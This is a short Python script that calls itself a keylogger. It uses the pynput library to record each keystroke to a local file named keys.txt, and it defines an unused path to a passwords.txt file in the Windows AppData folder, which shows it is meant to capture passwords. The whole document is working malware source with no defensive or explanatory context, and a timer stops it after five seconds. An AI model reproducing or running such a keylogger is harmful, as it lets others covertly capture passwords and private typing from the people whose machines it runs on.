
import os
from pynput.keyboard import Listener
from threading import Timer

file_to_write = os.environ['appdata'] + '\\passwords.txt'    # for running on Windows
#file_to_write = 'passwords.txt'      # for running on Linux and Mac

print("keylogger started.")
def on_press(key):

    key = str(key).replace("Key.backspace", "Backspace")

    file = open("keys.txt", "a")
    file.write(key)
    file.write('\n')
    file.close()

with Listener(on_press=on_press) as listener:
    Timer(5, listener.stop).start()
    listener.join()

print("keylogger shutdown.")
